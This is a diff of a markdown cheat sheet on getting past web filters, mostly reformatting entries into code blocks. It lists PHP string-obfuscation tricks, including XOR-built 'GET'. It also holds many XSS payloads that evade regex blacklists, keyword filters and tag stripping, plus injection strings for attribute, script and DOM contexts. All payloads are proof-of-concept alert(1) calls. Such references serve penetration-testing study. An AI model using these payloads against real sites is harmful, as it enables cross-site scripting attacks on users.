@@ -56,27 +56,27 @@ https://www.silisoftware.com/tools/ipconverter.php
 
 ### Mix - Hex + Octal
 
-echo "t\x72\x69\143\153s";
+`echo "T\x72\x69\143\153s";`
 
 //Tricks
 
 ### Variable Parsing
 
-$a = "ri"; $b ="ck"; echo "T$a[0]$a[1]$b[0]$b[1]s";
+`$a = "ri"; $b ="ck"; echo "T$a[0]$a[1]$b[0]$b[1]s"; `
 
 //Tricks
 
 ### Variable Variables
 
-$a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;
+`$a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;`
 
 //Tricks
 
 ### PHP Non-Alphanumeric 
 
-$\_="{"; #XOR char
+`$\_="{"; #XOR char`
 
-echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET
+`echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET`
 
 //GET
 
@@ -143,7 +143,7 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 ### Regex blacklist filtering
 
 (on\w+\s*=)
-
+```
 <svc/onload=alert(1)>
 
 <svg//////onload=alert(1)>
@@ -151,9 +151,10 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 <svg id=x;onload=alert(1)>
   
 <svg id=\`x\`onload=alert(1)>
-  
+``` 
+
 (?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
-  
+```  
 <svg onload%09=alert(1)>
   
 <svg %09onload=alert(1)>
@@ -163,22 +164,22 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 <svg onload%09%20%28%2C%3B=alert(1)>
   
 <svg onload%0B=alert(1)>
-
+```
 ### Keyword based in filter
  
 #### blocked - alert - bypass
   
--> <script>\u0061lert(1)</script>
+-> `<script>\u0061lert(1)</script>`
   
--> <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+-> `<script>\u0061\u006C\u0065\u0072\u0074(1)</script>`
   
--> <script>eval("\u0061lert(1)")</script>
+-> `<script>eval("\u0061lert(1)")</script>`
   
--> <script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script> 
+-> `<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>`
   
 #### Removing HTML Tags
   
-<scr<iframe>ipt>alert(1)</script>
+`<scr<iframe>ipt>alert(1)</script>`
   
 ### Scaping Quote
   
@@ -192,9 +193,9 @@ Ex:
  
 -> decode URI + unescape method
   
-decodeURI(/alert(%22xss%22)/.source)
+`decodeURI(/alert(%22xss%22)/.source)`
   
-decodeURIComponent(/alert(%22xss%22)/.source)
+`decodeURIComponent(/alert(%22xss%22)/.source)`
   
 Add execution sink for execution:
   
@@ -202,57 +203,52 @@ Add execution sink for execution:
   
 ### Escaping Parentheses
   
-\<img src=x onerror="\u0061lert(1)"/>
+`<img src=x onerror="\u0061lert(1)"/>`
   
-\<img src=x onerror="eval('\141lert(1)')"/>
+`<img src=x onerror="eval('\141lert(1)')"/>`
 
-\<img src=x onerror="eval('\x61lert(1)')"/>
-  
+`<img src=x onerror="eval('\x61lert(1)')"/>`
+
 ### Others Examples
-  
-#### HTML Tag
-  
-\<div>
-  
-here
-  
-\</div>
 
--> <svg/onload=alert(1)
+#### HTML Tag
+
+```
+<div>here</div>
+```
+-> `<svg/onload=alert(1)`
 
 #### HTML Tag Attributes
 
+```
 <input value="here"/></input>
+```
  
--> adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--
+-> `adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--`
   
 #### Script Tag
   
+```
 <script>
-  
-var name="here";
-  
-</div>
-  
+    var name="here";
 </script>
+```
   
--> ;alert(1);//
+->`;alert(1);//`
 
 #### Event Attributes
 
-\<button onclick="reserve(here);">
-  
-Okay!
-  
-</button>
+`<button onclick="reserve(here);">Okay!</button>`
 
 -> alert(1)
 
 Dom Based
   
-\<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
+```
+<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
+```
   
--> javascript:alert(1)
+-> `javascript:alert(1)`
 
 ### JavaScript Encoding and Compressor:
 
